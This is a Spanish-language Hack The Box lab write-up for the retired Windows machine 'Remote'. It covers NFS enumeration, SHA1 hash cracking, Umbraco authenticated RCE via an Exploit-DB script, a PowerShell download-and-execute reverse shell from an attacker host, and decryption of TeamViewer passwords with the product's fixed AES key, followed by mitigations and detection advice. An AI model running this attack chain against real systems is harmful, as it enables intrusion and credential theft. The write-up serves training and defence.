---
machine: Remote
os: Windows
difficulty: Medium
platform: Hack The Box
category: Windows / Web
state: Retired
tags: [windows, nfs, umbraco, sha1, xslt, rce, teamviewer, cve-2019-18988]
---

# Remote — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

FTP anónimo vacío, un IIS con Umbraco y un export NFS `/site_backups` abierto a todo el mundo. El backup contiene `Web.config` y `App_Data/Umbraco.sdf`, de donde sale el hash SHA1 sin sal de `admin@htb.local`; el diccionario lo rompe. Con esa cuenta se explota la RCE autenticada de Umbraco 7.12.4 (`xsltVisualize.aspx` con `msxsl:script`) y se obtiene ejecución como `defaultapppool`. En el registro queda la contraseña de TeamViewer 7 cifrada con la clave AES fija del producto; al descifrarla se ve que el administrador local reutiliza esa misma contraseña.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -oA nmap_all <IP>
nmap -p 21,80,111,135,139,445,2049,5985 -sCV -oA nmap_svc <IP>
```

```text
21/tcp   open  ftp        Microsoft ftpd (anonymous allowed)
80/tcp   open  http       Microsoft HTTPAPI httpd 2.0
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
5985/tcp open  wsman
```

- El FTP anónimo está vacío: no aporta nada.
- SMB no permite sesión nula, pero el export NFS sí está abierto a `everyone`.
- La web es un IIS con la portada de "Acme Widgets" y el CMS Umbraco detrás.

```bash
printf '%s\n' '<IP> remote.htb' | sudo tee -a /etc/hosts
```

## Enumeración

```bash
showmount -e <IP>          # /site_backups (everyone)
sudo mount -t nfs -o vers=3,nolock <IP>:/site_backups /mnt/
ls /mnt/
```

El export es el directorio raíz de la aplicación: `Web.config`, `bin/`, `Umbraco/`, `App_Data/`. El `Web.config` confirma la versión y la cadena de conexión; `App_Data/Umbraco.sdf` es la base SQL Server Compact con los usuarios.

```bash
strings /mnt/App_Data/Umbraco.sdf | grep -i 'admin@'
```

```text
admin@htb.local ... b8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}
```

Es SHA1 sin sal. El login bueno es el correo completo, no `admin`:

```bash
hashcat -m 100 admin.sha1 /usr/share/wordlists/rockyou.txt
# <PASSWORD>
```

## Foothold

Umbraco 7.12.4 tiene una RCE autenticada: el visualizador de XSLT del backoffice acepta un `xsltSelection` con un bloque `msxsl:script` que ejecuta C# en el contexto del pool.

```bash
searchsploit umbraco 7.12
# Exploit-DB 46153 · CVE-2019-25137
python3 46153.py -u 'admin@htb.local' -p '<PASSWORD>' -i http://remote.htb -c whoami
```

```text
iis apppool\defaultapppool
```

Para una shell interactiva se lanza PowerShell con una descarga desde el propio equipo:

```bash
python3 46153.py -u 'admin@htb.local' -p '<PASSWORD>' -i http://remote.htb \
  -c powershell.exe -a "-NoProfile -Command iex(New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-PowerShellTcp.ps1')"
```

Por qué funciona: el endpoint `developer/Xslt/xsltVisualize.aspx` está disponible para administradores del CMS y compila el XSLT con `msxsl:script`, que admite C# arbitrario. No hace falta un fallo de memoria ni un servicio expuesto.

## Movimiento lateral

No hay dominio ni segundo host. El salto es de `defaultapppool` a `Administrator` dentro del mismo servidor, mediante una credencial recuperada del registro.

## Escalada de privilegios

```powershell
tasklist /svc | findstr /i teamviewer
reg query "HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7" /v SecurityPasswordAES
```

TeamViewer 7 guarda la contraseña de acceso desatendido con una clave AES fija para todas las instalaciones (CVE-2019-18988). El valor `SecurityPasswordAES` se descifra con AES-128-CBC, clave `0602000000a400005253413100040000` e IV `0100010067244F436E6762F25EA8D704`, y el resultado se interpreta como UTF-16LE:

```python
from Crypto.Cipher import AES
key = bytes.fromhex('0602000000a400005253413100040000')
iv  = bytes.fromhex('0100010067244F436E6762F25EA8D704')
ct  = bytes.fromhex('<SECURITYPASSWORDAES>')
print(AES.new(key, AES.MODE_CBC, iv).decrypt(ct).decode('utf-16-le').rstrip('\x00'))
```

La contraseña resultante es la misma del administrador local:

```bash
evil-winrm -u Administrator -p '<PASSWORD>' -i remote.htb
# remote\administrator
psexec.py 'Administrator:<PASSWORD>@remote.htb'    # nt authority\system
```

`CVE-2019-18988` describe la exposición de la contraseña, no una elevación directa: la escalada existe porque la contraseña se reutiliza en la cuenta local. La ruta alternativa de `UsoSvc` que aparece en algunos write-ups es una mala configuración de permisos de servicio, no la vía prevista.

## Evidencia

- `showmount -e` con el export y `ls` del backup.
- Registro del hash SHA1 recortado y la contraseña ya descifrada, redactada.
- `whoami` como `defaultapppool`.
- `reg query` de `SecurityPasswordAES` con el valor recortado.
- Sin flags ni hashes completos.

## Lecciones aprendidas

- Un export NFS abierto a `everyone` equivale a publicar el código y la base de datos de la aplicación.
- Una base SQL Server Compact se lee con `strings`: no hace falta la herramienta de Microsoft.
- Umbraco 7.x con credenciales de administrador es ejecución de código por diseño del backoffice.
- Las claves AES fijas de un producto convierten un secreto local en una credencial recuperable por cualquiera con acceso al registro.
- La reutilización de contraseña es lo que transforma una fuga en escalada.

## Mitigaciones y detección

- Restringir el export NFS por host y por usuario; no exportar el directorio de la aplicación.
- Sacar del árbol web los backups y las bases de datos; usar hashes con sal y factor de trabajo (bcrypt/PBKDF2), no SHA1.
- Actualizar Umbraco y restringir el acceso al backoffice por red o VPN; retirar `xsltVisualize.aspx` si no se usa.
- Actualizar TeamViewer y rotar la contraseña desatendida; no reutilizarla en cuentas del sistema.
- Detección: montajes NFS desde equipos no habituales; lecturas de `App_Data/*.sdf`; `POST` a `xsltVisualize.aspx` con `msxsl:script`; procesos `w3wp.exe` que lanzan `cmd`/`powershell`; accesos a `HKLM\...\TeamViewer\Version7` desde una cuenta de servicio web.

MITRE: T1135, T1552.001, T1110.002, T1190, T1059.001, T1059.003, T1552.002, T1078.003, T1021.006.

## Referencias

- <https://0xdf.gitlab.io/2020/09/05/htb-remote.html>
- <https://netosec.com/remote-hackthebox-writeup>
- <https://www.exploit-db.com/exploits/46153>
- <https://nvd.nist.gov/vuln/detail/CVE-2019-25137>
- <https://nvd.nist.gov/vuln/detail/CVE-2019-18988>
